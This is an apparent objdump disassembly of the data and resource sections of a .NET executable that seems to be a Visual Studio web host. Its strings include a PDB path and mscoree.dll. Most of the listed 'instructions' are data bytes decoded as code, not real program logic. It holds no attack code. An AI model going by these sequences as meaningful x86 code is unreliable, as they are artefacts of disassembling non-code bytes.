  40cf73:	xor    DWORD PTR [ebx],esi
  40cf75:	xor    eax,0x61633966
  40cf7a:	xor    al,0x37
  40cf7c:	xor    sp,WORD PTR [edx+0x62]
  40cf80:	xor    ah,BYTE PTR [ebp+0x31]
  40cf83:	xor    BYTE PTR [ecx+0x66],ah
  40cf86:	data16 xor BYTE PTR [ecx+0x66],ah
  40cf8a:	xor    BYTE PTR [eax],bh
  40cf8c:	xor    al,0x39
  40cf8e:	xor    eax,0x62663430
  40cf93:	aaa    
  40cf94:	arpl   WORD PTR [ebp+0x61],sp
  40cf97:	xor    esp,DWORD PTR [esi+0x66]
  40cf9a:	xor    DWORD PTR [ecx],edi
  40cf9c:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  40cfa0:	fs xor BYTE PTR gs:[ebp+0x64],ah
  40cfa5:	popa   
  40cfa6:	fs ss xor al,0x63
  40cfaa:	cmp    BYTE PTR ss:[ebp+0x66],ah
  40cfae:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  40cfb3:	xor    eax,0x30336436
  40cfb8:	xor    ah,BYTE PTR [ecx+0x64]
  40cfbb:	xor    eax,0x36646635
  40cfc0:	cmp    BYTE PTR gs:[eax],dh
  40cfc3:	xor    si,WORD PTR [eax]
  40cfc6:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  40cfca:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  40cfcf:	cmp    DWORD PTR gs:0x38353633,esi
  40cfd6:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  40cfde:	bound  esi,QWORD PTR ds:0x63363366
  40cfe4:	xor    eax,0x66653234
  40cfe9:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  40cfee:	data16 cmp BYTE PTR [eax],bh
  40cff1:	cmp    BYTE PTR ds:0x33643833,dh
  40cff7:	aaa    
  40cff8:	xor    al,0x63
  40cffa:	xor    WORD PTR gs:[eax],si
  40cffe:	ss popa 
  40d000:	arpl   WORD PTR [esi+0x37],sp
  40d003:	cmp    DWORD PTR fs:[ebx],esi
  40d006:	popa   
  40d007:	xor    al,0x34
  40d009:	xor    al,0x35
  40d00b:	arpl   WORD PTR [ebx],si
  40d00d:	arpl   WORD PTR [edi],si
  40d00f:	xor    esp,DWORD PTR [ebx+0x64]
  40d012:	cmp    DWORD PTR [ecx],esi
  40d014:	xor    DWORD PTR [esi+0x30],esp
  40d017:	xor    eax,0x61613137
  40d01c:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  40d021:	fs popa 
  40d023:	xor    DWORD PTR [edx],esi
  40d025:	bound  esi,QWORD PTR [ecx]
  40d027:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  40d02b:	arpl   WORD PTR [ebx],si
  40d02d:	aaa    
  40d02e:	xor    eax,0x813362
  40d033:	popa   
  40d034:	xor    eax,0x36363861
  40d039:	xor    DWORD PTR gs:[ebp+0x65],esp
  40d03d:	xor    DWORD PTR [eax],edi
  40d03f:	data16 cmp BYTE PTR ss:[eax],dh
  40d043:	aaa    
  40d044:	ss cmp BYTE PTR ss:[edx],dh
  40d048:	xor    BYTE PTR [ecx],bh
  40d04a:	xor    sp,WORD PTR [edx+0x31]
  40d04e:	xor    DWORD PTR [edx],esi
  40d050:	xor    esi,DWORD PTR [esi]
  40d052:	popa   
  40d053:	arpl   WORD PTR [ebp+0x35],sp
  40d056:	xor    dh,BYTE PTR gs:[ecx]
  40d059:	xor    WORD PTR [ecx],si
  40d05c:	aaa    
  40d05d:	cmp    BYTE PTR [eax],dh
  40d05f:	xor    esp,DWORD PTR [ecx+0x33]
  40d062:	xor    DWORD PTR [ebx+esi*1],esi
  40d065:	popa   
  40d066:	bound  esp,QWORD PTR [edx+0x31]
  40d069:	xor    dh,BYTE PTR [esi]
  40d06b:	fs xor BYTE PTR fs:[ebx],dh
  40d06f:	xor    eax,0x32643764
  40d074:	data16 cmp BYTE PTR [edi],dh
  40d077:	bound  esi,QWORD PTR ss:[esi]
  40d07a:	cmp    DWORD PTR [ebx],esi
  40d07c:	cmp    BYTE PTR [ecx+0x61],ah
  40d07f:	data16 xor ah,BYTE PTR [ebp+0x65]
  40d083:	xor    esi,DWORD PTR [ecx+esi*1]
  40d086:	xor    al,0x64
  40d088:	xor    eax,0x64303234
  40d08d:	aaa    
  40d08e:	xor    eax,0x31323633
  40d093:	xor    al,0x30
  40d095:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  40d099:	xor    al,0x61
  40d09b:	xor    al,0x39
  40d09d:	arpl   WORD PTR [eax+edi*1],si
  40d0a0:	arpl   WORD PTR ss:[ebp+0x31],sp
  40d0a4:	xor    esi,DWORD PTR [ebx+esi*1]
  40d0a7:	xor    BYTE PTR [eax],dh
  40d0a9:	popa   
  40d0aa:	xor    dh,BYTE PTR [ecx]
  40d0ac:	xor    BYTE PTR [esi],dh
  40d0ae:	popa   
  40d0af:	bound  esi,QWORD PTR fs:[esi]
  40d0b2:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  40d0b6:	xor    esi,DWORD PTR [ebx]
  40d0b8:	xor    eax,0x65663039
  40d0bd:	data16 cmp BYTE PTR [ecx+0x64],ah
  40d0c1:	xor    eax,0x63333463
  40d0c6:	bound  esp,QWORD PTR [ecx+0x38]
  40d0c9:	xor    dh,BYTE PTR [edx]
  40d0cb:	cmp    DWORD PTR [eax],esi
  40d0cd:	arpl   WORD PTR fs:[ecx+edi*1],si
  40d0d1:	xor    eax,0x66653033
  40d0d6:	data16 cmp BYTE PTR fs:[esi],dh
  40d0da:	xor    eax,0x39643332
  40d0df:	xor    al,0x38
  40d0e1:	xor    esp,DWORD PTR [ebx+0x30]
  40d0e4:	xor    BYTE PTR [esi+0x34],ah
  40d0e7:	xor    eax,0x34666138
  40d0ec:	cmp    BYTE PTR ss:[ecx],bh
  40d0ef:	xor    BYTE PTR [eax],dh
  40d0f1:	xor    esi,DWORD PTR [esi]
  40d0f3:	bound  esi,QWORD PTR [eax]
  40d0f5:	xor    ah,BYTE PTR gs:[ebx+0x36]
  40d0f9:	xor    DWORD PTR [eax+esi*1+0x37],esp
  40d0fd:	aaa    
  40d0fe:	fs aaa 
  40d100:	bound  sp,DWORD PTR [ecx+0x63]
  40d104:	xor    al,0x36
  40d106:	aaa    
  40d107:	popa   
  40d108:	xor    eax,0x62653630
  40d10d:	popa   
  40d10e:	xor    bh,BYTE PTR [ecx]
  40d110:	gs xor al,0x36
  40d113:	aaa    
  40d114:	popa   
  40d115:	cmp    BYTE PTR [edi],dh
  40d117:	xor    DWORD PTR [ecx],edi
  40d119:	cmp    BYTE PTR [edx+0x30],ah
  40d11c:	xor    eax,0x34376333
  40d121:	cmp    DWORD PTR [ecx+0x61],esp
  40d124:	xor    ah,BYTE PTR [ecx+0x34]
  40d127:	xor    bh,BYTE PTR fs:[eax]
  40d12a:	xor    al,0x30
  40d12c:	arpl   WORD PTR [edi],si
  40d12e:	cmp    BYTE PTR [eiz*2+0x6436],dh
  40d135:	push   ds
  40d136:	add    DWORD PTR [eax],eax
  40d138:	add    DWORD PTR [eax],eax
  40d13a:	push   esp
  40d13b:	add    dl,BYTE PTR [esi]
  40d13d:	push   edi
  40d13e:	jb     0x40d1a1
  40d140:	jo     0x40d190
  40d142:	outs   dx,DWORD PTR ds:[esi]
  40d143:	outs   dx,BYTE PTR ds:[esi]
  40d144:	inc    ebp
  40d145:	js     0x40d1aa
  40d147:	gs jo  0x40d1be
  40d14a:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40d151:	ja     0x40d1c6
  40d153:	add    DWORD PTR [eax],ecx
  40d155:	add    DWORD PTR [eax],eax
  40d157:	add    al,BYTE PTR [eax]
  40d159:	add    BYTE PTR [eax],al
  40d15b:	add    BYTE PTR [eax],al
  40d15d:	or     BYTE PTR [ecx],al
  40d15f:	add    BYTE PTR [eax],cl
	...
  40d169:	add    BYTE PTR [eax],al
  40d16b:	add    BYTE PTR [esi-0x36],al
  40d16e:	adc    DWORD PTR [eax+0x0],edx
  40d171:	add    BYTE PTR [eax],al
  40d173:	add    BYTE PTR [edx],al
  40d175:	add    BYTE PTR [eax],al
  40d177:	add    BYTE PTR [ecx+eax*1],bl
  40d17a:	add    BYTE PTR [eax],al
  40d17c:	test   cl,dl
  40d17e:	add    BYTE PTR [eax],al
  40d180:	test   BYTE PTR [ebx+0x53520000],dh
  40d186:	inc    esp
  40d187:	push   ebx
  40d188:	retf   0x21d0
  40d18b:	(bad)  [ecx]
  40d18d:	mov    ah,0x5b
  40d18f:	dec    ecx
  40d190:	mov    ecx,DWORD PTR [edx+0x6b68edf]
  40d196:	dec    esi
  40d197:	aaa    
  40d198:	add    DWORD PTR [eax],eax
  40d19a:	add    BYTE PTR [eax],al
  40d19c:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  40d1a1:	outs   dx,BYTE PTR ds:[esi]
  40d1a2:	popa   
  40d1a3:	jb     0x40d20e
  40d1a5:	gs jae 0x40d204
  40d1a8:	dec    ecx
  40d1a9:	outs   dx,BYTE PTR ds:[esi]
  40d1aa:	je     0x40d211
  40d1ac:	jb     0x40d21b
  40d1ae:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x65765c65
  40d1b7:	outs   dx,BYTE PTR ds:[esi]
  40d1b8:	jne    0x40d22d
  40d1ba:	pop    esp
  40d1bb:	ins    DWORD PTR es:[edi],dx
  40d1bc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40d1c3:	je     0x40d1f3
  40d1c5:	jbe    0x40d230
  40d1c7:	jae    0x40d23e
  40d1c9:	popa   
  40d1ca:	ins    BYTE PTR es:[edi],dx
  40d1cb:	jae    0x40d241
  40d1cd:	jne    0x40d233
  40d1cf:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626577
  40d1d6:	push   0x2e74736f
  40d1db:	arpl   WORD PTR [ebx+0x70],si
  40d1de:	jb     0x40d24f
  40d1e0:	push   0x5f
  40d1e2:	pop    edi
  40d1e3:	xor    DWORD PTR [ecx],edi
  40d1e5:	xor    BYTE PTR [eax],bh
  40d1e7:	xor    DWORD PTR [ecx],edi
  40d1e9:	xor    BYTE PTR [esi],dh
  40d1eb:	cmp    DWORD PTR [eax],esi
  40d1ed:	pop    esp
  40d1ee:	outs   dx,DWORD PTR ds:[esi]
  40d1ef:	bound  ebp,QWORD PTR [edx+0x72]
  40d1f2:	pop    esp
  40d1f3:	js     0x40d22d
  40d1f5:	ss pop esp
  40d1f7:	dec    ebp
  40d1f8:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40d1ff:	je     0x40d22f
  40d201:	push   esi
  40d202:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40d209:	jne    0x40d26f
  40d20b:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  40d212:	dec    eax
  40d213:	outs   dx,DWORD PTR ds:[esi]
  40d214:	jae    0x40d28a
  40d216:	cs jo  0x40d27d
  40d219:	bound  eax,QWORD PTR [eax]
	...
  40d29f:	add    al,cl
  40d2a1:	rol    BYTE PTR [eax],cl
	...
  40d2ab:	add    dh,bl
  40d2ad:	rol    BYTE PTR [eax],cl
  40d2af:	add    BYTE PTR [eax],al
  40d2b1:	and    BYTE PTR [eax],al
	...
  40d2c7:	add    al,dl
  40d2c9:	rol    BYTE PTR [eax],cl
  40d2cb:	add    BYTE PTR [eax],al
  40d2cd:	add    BYTE PTR [eax],al
  40d2cf:	add    BYTE PTR [eax],al
  40d2d1:	add    BYTE PTR [edi+0x43],bl
  40d2d4:	outs   dx,DWORD PTR ds:[esi]
  40d2d5:	jb     0x40d31c
  40d2d7:	js     0x40d33e
  40d2d9:	dec    ebp
  40d2da:	popa   
  40d2db:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40d2e2:	jb     0x40d349
  40d2e4:	gs cs fs ins BYTE PTR es:[edi],dx
  40d2e8:	ins    BYTE PTR es:[edi],dx
  40d2e9:	add    BYTE PTR [eax],al
  40d2eb:	add    BYTE PTR [eax],al
  40d2ed:	add    bh,bh
  40d2ef:	and    eax,0x402000

Disassembly of section .rsrc:

0040e000 <.rsrc>:
	...
  40e008:	add    al,0x0
  40e00a:	add    BYTE PTR [eax],al
  40e00c:	add    DWORD PTR [eax],eax
  40e00e:	add    al,BYTE PTR [eax]
  40e010:	call   0x28c0e015
  40e015:	add    BYTE PTR [eax],al
  40e017:	adc    BYTE PTR [eax],0x0
  40e01a:	add    BYTE PTR [eax],al
  40e01c:	inc    eax
  40e01d:	add    BYTE PTR [eax],al
  40e01f:	sbb    BYTE PTR [eax],0x0
  40e022:	add    BYTE PTR [eax],al
  40e024:	pop    eax
  40e025:	add    BYTE PTR [eax],al
  40e027:	add    BYTE PTR [eax],0x0
  40e02a:	add    BYTE PTR [eax],al
  40e02c:	add    BYTE PTR [eax],al
  40e02e:	add    BYTE PTR [eax],al
  40e030:	add    al,0x0
  40e032:	add    BYTE PTR [eax],al
  40e034:	add    DWORD PTR [eax],eax
  40e036:	add    BYTE PTR [eax],al
  40e038:	lock add BYTE PTR [eax],al
  40e03b:	xor    BYTE PTR [eax+0x0],0x0
  40e03f:	add    BYTE PTR [eax],0x0
  40e042:	add    BYTE PTR [eax],al
  40e044:	add    BYTE PTR [eax],al
  40e046:	add    BYTE PTR [eax],al
  40e048:	add    al,0x0
  40e04a:	add    BYTE PTR [eax],al
  40e04c:	add    BYTE PTR [eax],al
  40e04e:	add    DWORD PTR [eax],eax
  40e050:	add    DWORD PTR [eax],eax
  40e052:	add    BYTE PTR [eax],al
  40e054:	mov    BYTE PTR [eax],al
  40e056:	add    BYTE PTR [eax+0x0],al
  40e05c:	add    BYTE PTR [eax],al
  40e05e:	add    BYTE PTR [eax],al
  40e060:	add    al,0x0
  40e062:	add    BYTE PTR [eax],al
  40e064:	add    BYTE PTR [eax],al
  40e066:	add    DWORD PTR [eax],eax
  40e068:	add    DWORD PTR [eax],eax
  40e06a:	add    BYTE PTR [eax],al
  40e06c:	mov    al,ds:0x800000
  40e071:	add    BYTE PTR [eax],al
  40e073:	add    BYTE PTR [eax],al
  40e075:	add    BYTE PTR [eax],al
  40e077:	add    BYTE PTR [eax+eax*1],al
  40e07a:	add    BYTE PTR [eax],al
  40e07c:	add    BYTE PTR [eax],al
  40e07e:	add    DWORD PTR [eax],eax
  40e080:	add    BYTE PTR [eax],al
  40e082:	add    BYTE PTR [eax],al
  40e084:	mov    eax,0x0
  40e089:	add    BYTE PTR [eax],al
  40e08b:	add    BYTE PTR [eax],al
  40e08d:	add    BYTE PTR [eax],al
  40e08f:	add    BYTE PTR [eax+eax*1],al
  40e092:	add    BYTE PTR [eax],al
  40e094:	add    BYTE PTR [eax],al
  40e096:	add    DWORD PTR [eax],eax
  40e098:	add    BYTE PTR [eax],al
  40e09a:	add    BYTE PTR [eax],al
  40e09c:	enter  0x0,0x0
	...
  40e0a8:	add    al,0x0
  40e0aa:	add    BYTE PTR [eax],al
  40e0ac:	add    BYTE PTR [eax],al
  40e0ae:	add    DWORD PTR [eax],eax
  40e0b0:	add    BYTE PTR [eax],al
  40e0b2:	add    BYTE PTR [eax],al
  40e0b4:	fadd   DWORD PTR [eax]
  40e0b6:	add    BYTE PTR [eax],al
  40e0b8:	or     al,0xe1
  40e0ba:	add    BYTE PTR [eax],al
  40e0bc:	imul   ecx,DWORD PTR [edx],0x4e40000
  40e0c2:	add    BYTE PTR [eax],al
  40e0c4:	add    BYTE PTR [eax],al
  40e0c6:	add    BYTE PTR [eax],al
  40e0c8:	js     0x40e0b5
  40e0ca:	add    BYTE PTR [eax],al
  40e0cc:	push   0xe4000004
  40e0d1:	add    al,0x0
  40e0d3:	add    BYTE PTR [eax],al
  40e0d5:	add    BYTE PTR [eax],al
  40e0d7:	add    al,ah
  40e0d9:	out    dx,eax
  40e0da:	add    BYTE PTR [eax],al
  40e0dc:	aas    
  40e0dd:	add    eax,0x4e40000
  40e0e2:	add    BYTE PTR [eax],al
  40e0e4:	add    BYTE PTR [eax],al
  40e0e6:	add    BYTE PTR [eax],al
  40e0e8:	add    eax,DWORD PTR [eax]
  40e0ea:	dec    ecx
  40e0eb:	add    BYTE PTR [edx+0x0],al
  40e0ee:	inc    ebx
  40e0ef:	add    BYTE PTR [eax+eax*1],cl
  40e0f2:	push   eax
  40e0f3:	add    BYTE PTR [edx+0x0],dl
  40e0f6:	dec    edi
  40e0f7:	add    BYTE PTR [esi+0x0],al
  40e0fa:	dec    ecx
  40e0fb:	add    BYTE PTR [eax+eax*1+0x45],cl
  40e0ff:	add    BYTE PTR [edi+0x0],bl
  40e102:	inc    esp
  40e103:	add    BYTE PTR [ecx+0x0],al
  40e106:	push   esp
  40e107:	add    BYTE PTR [ecx+0x0],al
  40e10a:	add    BYTE PTR [eax],al
  40e10c:	sub    BYTE PTR [eax],al
  40e10e:	add    BYTE PTR [eax],al
  40e110:	push   ds
  40e111:	icebp  
  40e112:	shl    BYTE PTR [ecx+0x3],1
  40e118:	in     eax,0xc7
  40e11a:	xor    ecx,ebx
  40e11c:	jne    0x40e15c
  40e11e:	sub    al,BYTE PTR [ecx-0x47]
  40e121:	or     BYTE PTR [ebp+0xc758dda],ch
  40e127:	xchg   esp,eax
  40e128:	or     al,0x0
  40e12a:	add    BYTE PTR [eax],al
  40e12c:	add    BYTE PTR [eax],al
  40e12e:	add    BYTE PTR [eax],al
  40e130:	add    eax,DWORD PTR [eax]
  40e132:	add    BYTE PTR [eax],al
  40e134:	sldt   WORD PTR [eax]
  40e137:	add    BYTE PTR [ecx],al
  40e139:	add    BYTE PTR [eax],al
  40e13b:	add    al,ah
  40e13d:	add    BYTE PTR [eax],al
  40e13f:	add    BYTE PTR [ebp+eax*1+0x0],dh
  40e143:	add    BYTE PTR [ebx],al
  40e145:	add    BYTE PTR [eax],al
  40e147:	add    BYTE PTR [esi+eax*1+0x0],dl
  40e14b:	add    BYTE PTR [edx],cl
  40e14d:	add    BYTE PTR [eax],al
  40e14f:	add    BYTE PTR [eax+eax*1],al
  40e152:	add    BYTE PTR [eax],al
  40e154:	pop    esi
  40e155:	push   es
  40e156:	add    BYTE PTR [eax],al
  40e158:	dec    esp
  40e159:	add    BYTE PTR [eax],al
  40e15b:	add    BYTE PTR ds:0xaa000000,al
  40e161:	push   es
  40e162:	add    BYTE PTR [eax],al
  40e164:	imul   eax,DWORD PTR [eax],0x70000
  40e16a:	add    BYTE PTR [eax],al
  40e16c:	adc    eax,DWORD PTR [edi]
  40e16e:	add    BYTE PTR [eax],al
  40e170:	push   es
  40e171:	add    BYTE PTR [eax],al
  40e173:	add    BYTE PTR [ecx],cl
  40e175:	add    BYTE PTR [eax],al
  40e177:	add    BYTE PTR [ecx],bl
  40e179:	pop    es
  40e17a:	add    BYTE PTR [eax],al
  40e17c:	sub    DWORD PTR [ecx],eax
  40e17e:	add    BYTE PTR [eax],al
  40e180:	or     eax,DWORD PTR [eax]
  40e182:	add    BYTE PTR [eax],al
  40e184:	inc    edx
  40e185:	or     BYTE PTR [eax],al
  40e187:	add    BYTE PTR [esi],ch
  40e189:	add    BYTE PTR [eax],al
  40e18b:	add    BYTE PTR ds:0x70000000,cl
  40e191:	or     BYTE PTR [eax],al
  40e193:	add    BYTE PTR [edi],ch
  40e195:	add    BYTE PTR [eax],al
  40e197:	add    BYTE PTR [edi],cl
  40e199:	add    BYTE PTR [eax],al
  40e19b:	add    BYTE PTR [edi+0x40000008],bl
  40e1a1:	add    BYTE PTR [eax],al
  40e1a3:	add    BYTE PTR [ebx],ah
  40e1a5:	add    BYTE PTR [eax],al
  40e1a7:	add    bh,bl
  40e1a9:	or     BYTE PTR [eax],al
  40e1ab:	add    BYTE PTR [esi],al
  40e1ad:	add    BYTE PTR [eax],al
  40e1af:	add    BYTE PTR [esi],ah
  40e1b1:	add    BYTE PTR [eax],al
  40e1b3:	add    ch,ah
  40e1b5:	or     BYTE PTR [eax],al
  40e1b7:	add    BYTE PTR [eax+eax*1],bl
  40e1ba:	add    BYTE PTR [eax],al
  40e1bc:	xor    BYTE PTR [eax],al
  40e1be:	add    BYTE PTR [eax],al
  40e1c0:	add    DWORD PTR [ecx],ecx
  40e1c2:	add    BYTE PTR [eax],al
  40e1c4:	inc    ebx
  40e1c5:	add    BYTE PTR [eax],al
  40e1c7:	add    BYTE PTR [edx],dh
  40e1c9:	add    BYTE PTR [eax],al
  40e1cb:	add    BYTE PTR [ecx+ecx*1+0x0],al
  40e1cf:	add    BYTE PTR [esi+0x0],cl
  40e1d2:	add    BYTE PTR [eax],al
  40e1d4:	xor    eax,DWORD PTR [eax]
  40e1d6:	add    BYTE PTR [eax],al
  40e1d8:	xchg   edx,eax
  40e1d9:	or     DWORD PTR [eax],eax
  40e1db:	add    BYTE PTR [eax+eax*1+0x0],al
  40e1df:	add    BYTE PTR [edx],al
  40e1e1:	add    BYTE PTR [eax],al
  40e1e3:	add    dh,dl
  40e1e5:	or     DWORD PTR [eax],eax
  40e1e7:	add    BYTE PTR [edi+0x3000000],cl
  40e1ed:	add    BYTE PTR [eax],al
  40e1ef:	add    BYTE PTR [esi+0x57000001],dh
  40e1f5:	add    BYTE PTR [eax],al
  40e1f7:	add    BYTE PTR [ecx],bh
  40e1f9:	add    ecx,ebp
  40e1fb:	add    al,0x3
  40e1fd:	adc    al,0x6
  40e1ff:	add    ecx,DWORD PTR [esi]
  40e201:	add    ebx,DWORD PTR [esi]
  40e203:	add    ebp,DWORD PTR [esi]
  40e205:	add    edi,DWORD PTR [esi]
  40e207:	add    ecx,DWORD PTR [esi+0x3]
  40e20a:	pop    esi
  40e20b:	add    esi,DWORD PTR [eax+0x3]
  40e20e:	xchg   ebx,eax
  40e20f:	add    DWORD PTR [ebx],eax
  40e211:	mov    ebp,0x1ed0301
  40e216:	add    esp,DWORD PTR [ecx+0x3c10302]
  40e21c:	add    ebp,ebp
  40e21e:	add    eax,DWORD PTR [ebx]
  40e220:	inc    BYTE PTR [ebx]
  40e222:	add    ecx,DWORD PTR [edi+0x4990304]
  40e228:	add    ebp,DWORD PTR [esi+0x4b50304]
  40e22e:	add    eax,ebp
  40e230:	add    al,0x3
  40e232:	push   ss
  40e233:	add    al,0x5a
  40e235:	add    ecx,DWORD PTR [ecx]
  40e237:	adc    DWORD PTR [ebx],eax
  40e239:	adc    al,0x3
  40e23b:	xor    eax,DWORD PTR [ecx]
  40e23d:	cmp    al,0x1
  40e23f:	dec    ebp
  40e240:	add    ecx,DWORD PTR [edi+0x3]
  40e243:	push   edx
  40e244:	add    ebx,DWORD PTR [eax+0x3]
  40e247:	pop    ecx
  40e248:	add    eax,DWORD PTR [esi]
  40e24a:	add    eax,0x15010316
  40e24f:	add    ecx,DWORD PTR [eax]
  40e251:	push   es
  40e252:	enter  0x301,0x1
  40e256:	mov    dl,0x1
  40e258:	add    eax,DWORD PTR [eax+ecx*1]
  40e25b:	or     al,0x3
  40e25d:	add    BYTE PTR [ecx+ecx*1],al
  40e260:	or     eax,DWORD PTR [ebx]
  40e262:	add    BYTE PTR [ebx+ecx*1],al
  40e265:	push   es
  40e266:	or     eax,0x270d0800
  40e26b:	or     eax,0x260d0a02
  40e270:	or     eax,0x3010e04
  40e275:	add    BYTE PTR [eax+edx*1],al
  40e278:	or     eax,0x11040003
  40e27d:	add    DWORD PTR [ebx],eax
  40e27f:	add    BYTE PTR [edx+edx*1],al
  40e282:	adc    al,BYTE PTR [ebx]
  40e284:	add    BYTE PTR [ecx],dl
  40e286:	adc    esi,DWORD PTR [edx-0x2d]
  40e289:	pop    es
  40e28a:	add    al,0x1b
  40e28c:	rol    DWORD PTR [edi],cl
  40e28e:	cmp    al,0xd3
  40e290:	pop    es
  40e291:	dec    edi
  40e292:	rol    DWORD PTR [edi],cl
  40e294:	jo     0x40e269
  40e296:	pop    es
  40e297:	add    al,0x14
  40e299:	add    DWORD PTR [ebx],eax
  40e29b:	add    BYTE PTR [esi+edx*1],al
  40e29e:	add    DWORD PTR [ebx],eax
  40e2a0:	add    BYTE PTR ds:0x7d30117,al
  40e2a6:	add    BYTE PTR [esi],cl
  40e2a8:	sbb    dl,BYTE PTR [edx-0x2d]
  40e2ab:	pop    es
  40e2ac:	add    ecx,DWORD PTR [edi]
  40e2ae:	rol    DWORD PTR [edi],cl
  40e2b0:	rol    DWORD PTR cs:[edi],cl
  40e2b3:	dec    edx
  40e2b4:	rol    DWORD PTR [edi],cl
  40e2b6:	add    al,0x1b
  40e2b8:	push   cs
  40e2b9:	add    DWORD PTR [eax],eax
  40e2bb:	add    al,0x1e
  40e2bd:	or     eax,0x22040008
  40e2c2:	cmp    DWORD PTR ds:0x87232400,eax
  40e2c8:	add    DWORD PTR ds:0x1b05120e,eax
  40e2ce:	add    eax,0x42e0124
  40e2d3:	inc    ecx
  40e2d4:	add    al,0x43
  40e2d6:	add    al,0x5f
  40e2d8:	add    al,0x6c
  40e2da:	or     BYTE PTR [ebp+0x4],dh
  40e2dd:	ja     0x40e2e3
  40e2df:	jnp    0x40e2e5
  40e2e1:	add    BYTE PTR [ecx],0x4
  40e2e4:	add    DWORD PTR [ecx],0x4
  40e2e7:	test   DWORD PTR [ecx],eax
  40e2e9:	add    eax,0x5762416
  40e2ee:	or     DWORD PTR [esi],eax
  40e2f0:	push   es
  40e2f1:	daa    
  40e2f2:	push   es
  40e2f3:	ss push es
  40e2f5:	inc    ebp
  40e2f6:	add    eax,0x1630554
  40e2fb:	addr16 add eax,0x5740a6b
  40e301:	and    al,0x25
  40e303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e304:	add    al,BYTE PTR ds:0x3305210c
  40e30a:	add    eax,0x56a0549
  40e30f:	jl     0x40e316
  40e311:	xchg   edx,eax
  40e312:	add    DWORD PTR ds:0xc50501b3,eax
  40e318:	add    DWORD PTR ds:0xfb0501db,eax
  40e31e:	add    DWORD PTR ds:0xa305028d,eax
  40e324:	add    al,BYTE PTR ds:0x1bc262c
  40e32a:	add    DWORD PTR [edi],ecx
  40e32c:	sbb    DWORD PTR [ecx],eax
  40e32e:	push   ds
  40e32f:	add    eax,0x4560547
  40e334:	add    esi,DWORD PTR gs:[ecx+eax*1-0x80]
  40e339:	add    DWORD PTR [edx],eax
  40e33b:	mov    DWORD PTR [ecx],eax
  40e33d:	add    edx,DWORD PTR [edx+0x19e0301]
  40e343:	push   es
  40e344:	stos   BYTE PTR es:[edi],al
  40e345:	add    DWORD PTR [ecx],eax
  40e347:	lods   al,BYTE PTR ds:[esi]
  40e348:	add    DWORD PTR [ecx],eax
  40e34a:	mov    al,0x1
  40e34c:	add    DWORD PTR [edi+0x1b80101],esi
  40e352:	add    DWORD PTR ds:0x6066c27,edx
  40e358:	push   ds
  40e359:	pushf  
  40e35a:	add    al,0x36
  40e35c:	pushf  
  40e35d:	add    al,0x44
  40e35f:	pushf  
  40e360:	add    al,0x5d
  40e362:	pushf  
  40e363:	add    al,0x63
  40e365:	mov    ds:0x24066a04,al
  40e36a:	sub    BYTE PTR [edx+0x180c0101],bh
  40e370:	add    DWORD PTR ds:0x6a3c3f01,edi
  40e376:	cmp    bh,BYTE PTR [edx+0x3a]
  40e379:	add    DWORD PTR [ecx],0x3a
  40e37c:	xchg   DWORD PTR [ecx],eax
  40e37e:	das    
  40e37f:	cwde   
  40e380:	add    DWORD PTR ds:0xa30101a1,edi
  40e386:	add    DWORD PTR [ecx],eax
  40e388:	mov    bh,0x1
  40e38a:	add    DWORD PTR [eax+0x29040101],edi
  40e390:	sbb    al,BYTE PTR [ecx]
  40e392:	add    BYTE PTR [esp+ebp*1],al
  40e395:	pop    es
  40e396:	or     eax,0x72d0500
  40e39b:	retf   
  40e39c:	add    eax,DWORD PTR [eax]
  40e39e:	add    eax,0x3cb072e
  40e3a3:	add    BYTE PTR ds:0x3f30730,al
  40e3a9:	add    BYTE PTR [eax],dl
  40e3ab:	xor    DWORD PTR [edx+ebx*1+0x6],esi
  40e3af:	bndldx (bad),[edx]
  40e3b2:	or     eax,0xd550d3d
  40e3b7:	ins    BYTE PTR es:[edi],dx
  40e3b8:	or     eax,0x32050d73
  40e3bd:	pop    es
  40e3be:	xchg   esi,eax
  40e3bf:	pop    es
  40e3c0:	add    BYTE PTR ds:0x7960733,al
  40e3c6:	add    BYTE PTR ds:0x7960734,al
  40e3cc:	add    BYTE PTR [esi*1+0x12000b08],al
  40e3d3:	ss dec ebp
  40e3d5:	or     eax,0x310d1c07
  40e3da:	add    eax,DWORD PTR [eax+0xd]
  40e3dd:	inc    edx
  40e3de:	or     eax,0xd4b0d45
  40e3e3:	dec    esp
  40e3e4:	or     eax,0x1a63813
  40e3e9:	sbb    al,BYTE PTR [esi]
  40e3eb:	pop    ds
  40e3ec:	or     eax,0xd400d21
  40e3f1:	popa   
  40e3f2:	or     eax,0xa40d0182
  40e3f7:	add    DWORD PTR ds:0x233f390a,ecx
  40e3fd:	add    esp,DWORD PTR [esi]
  40e3ff:	and    esi,DWORD PTR [ebx]
  40e401:	and    edi,DWORD PTR ds:0xf3b0423
  40e407:	or     eax,0x6a3d1000
  40e40c:	and    eax,DWORD PTR [esi]
  40e40e:	or     ah,BYTE PTR [ebx]
  40e410:	sbb    al,0x23
  40e412:	das    
  40e413:	and    ebx,DWORD PTR [edx+0x23]
  40e416:	pop    esi
  40e417:	inc    esi
  40e418:	push   0x2a3f0823
  40e41d:	and    eax,DWORD PTR [edx]
  40e41f:	sbb    DWORD PTR [ebx],esp
  40e421:	sub    BYTE PTR [ebx],ah
  40e423:	xor    eax,DWORD PTR [eax-0x45]
  40e426:	add    esi,ebx
  40e428:	push   es
  40e429:	syscall 
  40e42b:	fiadd  WORD PTR [esi]
  40e42d:	das    
  40e42e:	add    eax,0xcb570555
